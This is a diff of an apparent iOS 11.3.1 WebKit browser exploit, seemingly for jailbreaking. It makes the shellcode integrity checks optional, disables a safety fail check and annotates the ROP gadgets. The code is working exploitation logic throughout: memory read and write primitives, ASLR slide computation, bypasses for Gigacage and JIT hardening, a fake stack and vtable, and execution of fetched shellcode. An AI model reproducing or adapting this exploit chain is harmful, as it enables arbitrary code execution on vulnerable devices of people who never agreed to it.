@@ -11,6 +11,8 @@
 
 using('verbosity');
 
+var INTEGRITY_CHECKS = false; //enable this if you want to check the shellcode for integrity.
+
 var UNITY = {
     TEN: 10,
     HUNDRED: 100,
@@ -37,13 +39,6 @@ var u8_buffer = new Uint8Array(workbuf);
 var shellcode_length = 0;
 var FPO = typeof(SharedArrayBuffer) === 'undefined' ? 0x18 : 0x10;
 
-//Hex conversion
-function hex(x) {
-    if (x < 0)
-        return `-${hex(-x)}`
-    return `0x${x.toString(16)}`
-}
-
 //Float to Integer conversion
 function f2i(f) {
     f64[0] = f;
@@ -55,6 +50,13 @@ function i2f(i) {
     i32[0] = i % BASE32;
     i32[1] = i / BASE32;
     return f64[0];
+}
+
+//Hex conversion
+function hex(x) {
+    if (x < 0)
+        return `-${hex(-x)}`
+    return `0x${x.toString(16)}`
 }
 
 //Exclusive OR operand on two numbers
@@ -187,7 +189,7 @@ var pwn = function() {
     };
     
 
-    if(verbosity === VERBOSITY.VERBOSE) print("Using padding: "+(FPO+0x8));
+    if(verbosity === VERBOSITY.VERBOSE) print("Using padding: "+hex(FPO+0x8));
     
     var fake_addr = stage1.addrof(outer) +FPO+0x8;
     
@@ -281,7 +283,7 @@ var pwn = function() {
         },
     }
 
-
+    stage2.test();
     if(verbosity === VERBOSITY.VERBOSE) print("Stage 2 test succeeded, continueing...");
     
     var wrapper = document.createElement('div');
@@ -294,22 +296,41 @@ var pwn = function() {
 
     //now get the ASLR slide
     var slide = stage2.read64(vtab_addr) - _off.vtable;
-    print("Dyld Shared Cache Slide: "+hex(slide));
     var disablePrimitiveGigacage = _off.disableprimitivegigacage + slide;
     var callbacks = _off.callbacks + slide;
     var g_gigacageBasePtrs =  _off.g_gigacagebaseptrs + slide;
     var g_typedArrayPoisons = _off.g_typedarraypoisons + slide;
     var longjmp = _off.longjmp + slide;
     var dlsym = _off.dlsym + slide;
+
     var startOfFixedExecutableMemoryPool = stage2.read64(_off.startfixedmempool + slide);
     var endOfFixedExecutableMemoryPool = stage2.read64(_off.endfixedmempool + slide);
     var jitWriteSeparateHeapsFunction = stage2.read64(_off.jit_writeseperateheaps_func + slide);
     var useFastPermisionsJITCopy = stage2.read64(_off.usefastpermissions_jitcopy + slide);
+
     var ptr_stack_check_guard = _off.ptr_stack_check_guard + slide;
+
+    // ModelIO:0x000000018d2f6564 :
+    //   ldr x8, [sp, #0x28]
+    //   ldr x0, [x8, #0x18]
+    //   ldp x29, x30, [sp, #0x50]
+    //   add sp, sp, #0x60
+    //   ret
     var pop_x8 = _off.modelio_popx8 + slide;
+
+    // CoreAudio:0x000000018409ddbc
+    //   ldr x2, [sp, #8]
+    //   mov x0, x2
+    //   ldp x29, x30, [sp, #0x10]
+    //   add sp, sp, #0x20
+    //   ret
     var pop_x2 = _off.coreaudio_popx2 + slide;
+
+    //see jitcode.s
     var linkcode_gadget = _off.linkcode_gadget + slide;
-    print('\ndisablePrimitiveGigacage @ ' + hex(disablePrimitiveGigacage)
+
+    print('\nSlide '+hex(slide)
+        + '\ndisablePrimitiveGigacage @ ' + hex(disablePrimitiveGigacage)
         + '\ng_gigacageBasePtrs @ ' + hex(g_gigacageBasePtrs)
         + '\ng_typedArrayPoisons @ ' + hex(g_typedArrayPoisons)
         + '\nstartOfFixedExecutableMemoryPool @ ' + hex(startOfFixedExecutableMemoryPool)
@@ -321,7 +342,7 @@ var pwn = function() {
     //JIT Hardening stuff
     if (!useFastPermisionsJITCopy || jitWriteSeparateHeapsFunction) {
         // Probably an older phone, should be even easier
-        fail(3);
+        //fail(3);
     }
     
     if(verbosity === VERBOSITY.VERBOSE) print("Setting up shellcode in memory...");
@@ -341,7 +362,6 @@ var pwn = function() {
 
     stage2.write64(shellcode_src + 4, dlsym);
               
-    if(verbosity === VERBOSITY.VERBOSE) print("Setting up fake stack...");
     //set up our fake executable stack
     var fake_stack = [
         0,
@@ -372,8 +392,6 @@ var pwn = function() {
           u32_buffer[0x2000/4 + 2*i+1] = fake_stack[i] / BASE32;
     }
     
-    if(verbosity >= VERBOSITY.HIGH) print("Setting up code execution...");
-
     //lets set up our code execution of the dylib payload
     stage2.write_non_zero(el_addr, [
         buffer_addr, // fake vtable
@@ -386,13 +404,35 @@ var pwn = function() {
         0,
         buffer_addr + 0x2000, // sp
     ]);
-    if(verbosity >= VERBOSITY.HIGH) print('shellcode is at ' + hex(shellcode_dst));
+
+    //if(verbosity >= VERBOSITY.HIGH) print('shellcode is at ' + hex(shellcode_dst));
     if(verbosity >= VERBOSITY.DEFAULT) print('EmptyList is started, please close all background apps then dismiss this alert.');
     wrapper.addEventListener('click', function(){}); //execute the shellcode
 };
 
+function integrity_checks(buffer) {
+    if(INTEGRITY_CHECKS) {
+        var shellcode_data = new Uint8Array(buffer);
+        var shellcode_hashes = {
+            md5: md5(shellcode_data.join('')),
+            sha1: Sha1.hash(shellcode_data.join('')),
+            sha256: sha512_256(shellcode_data.join('')),
+            sha384: sha384(shellcode_data.join('')),
+            sha512: sha512(shellcode_data.join(''))
+        };
+        
+        if(
+            shellcode_hashes.md5 !== "5b8d489beb89a7515dc7fb5ee2f4092d" || 
+            shellcode_hashes.sha1 !== "5d97f3843c1a3b88c7a95dae803b46e07a67d3ed" ||
+            shellcode_hashes.sha256 !== "a4a3254bc86d5b2030c0637173b927a489b98d1d29fcfcc8232636eec94a2fe8" ||
+            shellcode_hashes.sha384 !== "78791343c427ddd51c1bc236f77bafc4cfef04796f931d856e6652aadedb5ab54e46fe9b05e98ce7dc982eba9f1c6220" ||
+            shellcode_hashes.sha512 !== "ef48614b78b42be7bedb79a7aa768eb19ad8fb05cefac2d68c8d74ab6a95d77aa1054d255294b5bf7e9ece648ac916fa8999e79aa93a707732b9850418bd0053"
+        ) throw new Error('Shellcode integrity check failed.');
+    }
+}
+
 //The exploit initialization 
-var wk113go = function() {
+function wk113go() {
     
     //retrieve the shellcode containing the empty_list exploit by Ian Beer (Needs some work, doesn't check for request status code)
     fetch('payloads/11_3_1/emptylist.bin').then((response) => {
@@ -405,22 +445,8 @@ var wk113go = function() {
                 if(shellcode_length > 0x1000000) {
                     fail(5);
                 }
-
-                var shellcode_data = new Uint8Array(buffer);
-                var shellcode_hashes = {
-                    md5: md5(shellcode_data.join('')),
-                    sha1: Sha1.hash(shellcode_data.join('')),
-                    sha256: sha512_256(shellcode_data.join('')),
-                    sha384: sha384(shellcode_data.join('')),
-                    sha512: sha512(shellcode_data.join(''))
-                };
-                if(shellcode_hashes.md5 !== "5b8d489beb89a7515dc7fb5ee2f4092d") throw new Error('Shellcode integrity check failed.');
-                if(shellcode_hashes.sha1 !== "5d97f3843c1a3b88c7a95dae803b46e07a67d3ed") throw new Error('Shellcode integrity check failed.');
-                if(shellcode_hashes.sha256 !== "a4a3254bc86d5b2030c0637173b927a489b98d1d29fcfcc8232636eec94a2fe8") throw new Error('Shellcode integrity check failed.');
-                if(shellcode_hashes.sha384 !== "78791343c427ddd51c1bc236f77bafc4cfef04796f931d856e6652aadedb5ab54e46fe9b05e98ce7dc982eba9f1c6220") throw new Error('Shellcode integrity check failed.');
-                if(shellcode_hashes.sha512 !== "ef48614b78b42be7bedb79a7aa768eb19ad8fb05cefac2d68c8d74ab6a95d77aa1054d255294b5bf7e9ece648ac916fa8999e79aa93a707732b9850418bd0053") throw new Error('Shellcode integrity check failed.');
-                print("Shellcode sha512sum: "+shellcode_hashes.sha512);
-                u8_buffer.set(shellcode_data, 0x4000); //basically the same as what memset() and memcpy would do in c. uint8 is a char array containing our shellcode
+                integrity_checks(buffer);
+                u8_buffer.set(new Uint8Array(buffer), 0x4000); //basically the same as what memset() and memcpy would do in c. uint8 is a char array containing our shellcode
                 if(verbosity === VERBOSITY.HIGH) print('Received '+shellcode_length+ ' bytes of shellcode. Exploit will start now.');
                 pwn();
             } catch(exception) {
